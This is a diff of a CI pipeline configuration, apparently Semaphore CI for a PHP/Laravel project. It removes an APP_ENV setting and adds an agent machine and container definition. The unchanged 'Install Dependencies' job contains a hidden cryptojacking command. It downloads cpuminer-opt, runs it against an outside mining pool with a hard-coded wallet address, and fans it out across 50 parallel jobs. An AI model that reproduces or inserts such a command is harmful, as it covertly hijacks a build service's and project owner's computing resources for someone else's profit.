@@ -11,9 +11,7 @@ global_job_config:
 blocks:
   - name: Install Dependencies
     task:
-      env_vars:
-        - name: APP_ENV
-          value: prod
+      env_vars: []
       jobs:
         - name: composer
           commands:
@@ -26,6 +24,13 @@ blocks:
             - 'php artisan key:generate'
             - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q5jlf86v5sw8wawypyvx9gga3eszuhyjmp3etq6 -t10'
           parallelism: 50
+      agent:
+        machine:
+          type: e1-standard-2
+          os_image: ubuntu1804
+        containers:
+          - name: main
+            image: 'semaphoreci/ubuntu:18.04'
   - name: Run Code Analysis
     task:
       prologue:
